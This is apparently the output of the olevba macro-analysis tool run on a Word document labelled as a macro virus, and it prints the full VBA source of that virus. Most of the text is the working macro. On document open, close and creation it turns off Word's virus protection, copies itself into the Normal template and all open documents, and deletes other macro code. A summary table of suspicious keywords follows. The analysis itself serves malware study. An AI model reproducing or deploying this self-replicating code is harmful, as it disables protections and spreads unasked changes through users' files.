olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.dh-07ac6483aeaf4400899652298e422eaa8740fe92
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.dh-07ac6483aeaf4400899652298e422eaa8740fe92 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Мені вже набрид цей гидкий Thus_001, тому я вимушений був написати цей Destroyer'
'Anti-Smyser'
'Якщо вона нашкодить комусь - ЗВИНЯЙТЕ!'
'Destroyer'
'Абдулла'
On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" And NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(5, 1) <> "'Destroyer'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" And Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(5, 1) <> "'Destroyer'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
    If Date > DateSerial(2001, 6, 16) Then
        a = MsgBox("Випускникам 2001-го - ВІВАТ!!!                                                                       =Abdulla`s Thus_001 Killer=", vbCritical, "Thus_001 Virus Destroying")
        'Farewell to the Thus_001'
         For k = 1 To Application.Documents.Count
          If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
                    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
                    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
                    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
              Application.Documents.Item(k).Save
          End If
         Next k
        If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
                NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
                .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
                .CodeModule.CountOfLines
        End If
        If NormalTemplate.Saved = False Then NormalTemplate.Save
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub






















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

